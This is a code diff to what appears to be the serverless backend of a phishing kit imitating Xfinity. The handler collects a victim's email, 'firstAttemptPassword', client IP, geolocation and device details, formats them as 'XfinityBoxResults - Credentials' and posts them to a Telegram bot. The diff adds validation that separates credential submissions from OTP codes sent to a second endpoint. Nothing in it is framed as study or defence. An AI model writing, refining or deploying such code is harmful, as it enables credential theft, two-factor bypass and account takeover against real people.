@@ -99,7 +99,7 @@ const composeCredentialsMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 XfinityBoxResults - Credentials 🔐*
+*🔐XfinityBoxResults - Credentials 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: ${safeEmail}
@@ -139,18 +139,25 @@ exports.handler = async (event) => {
   }
   
   try {
-    const body = JSON.parse(event.body || '{}');
-    const data = body.data || body;
-    let message;
+    const data = JSON.parse(event.body || '{}');
 
-    // This function handles credentials only.
+    // Validate: this endpoint handles credentials ONLY.
+    // Reject any payload that looks like an OTP submission.
+    if (data.otp || !data.email || !data.firstAttemptPassword) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' }),
+      };
+    }
+
     const clientIP = getClientIp(event);
     const location = await getIpAndLocation(clientIP);
     const deviceDetails = getDeviceDetails(data.userAgent);
     const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
 
     const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
-    message = composeCredentialsMessage(messageData);
+    const message = composeCredentialsMessage(messageData);
 
     // Send the composed message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
